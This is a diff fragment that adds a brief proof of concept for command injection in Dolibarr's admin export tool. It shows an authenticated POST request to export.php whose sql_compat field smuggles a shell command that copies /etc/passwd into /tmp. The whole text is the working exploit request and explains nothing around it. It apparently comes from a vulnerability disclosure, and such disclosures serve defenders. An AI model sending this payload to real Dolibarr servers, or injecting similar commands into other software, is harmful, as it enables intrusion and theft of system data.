@@ -1,0 +1,7 @@
+The following proof of concept is given:
+POST /dolibarr/admin/tools/export.php HTTP/1.1
+[…]
+Cookie: DOLSESSID_[…]=[…]
+
+token=[...]&export_type=server&what=mysql&mysqldump=%2Fusr%2Fbin%2Fmysqldump&use_transaction=yes&disable_fk=yes&sql_compat=;cat
+/etc/passwd > /tmp/cintainfinitapasswd;&sql_structure=structure&drop=1&sql_data=data&showcolumns=yes&extended_ins=yes&delayed=yes&sql_ignore=yes&hexforbinary=yes&filename_template=mysqldump_dolibarrdebian_3.1.1_201203231716.sql&compression=none
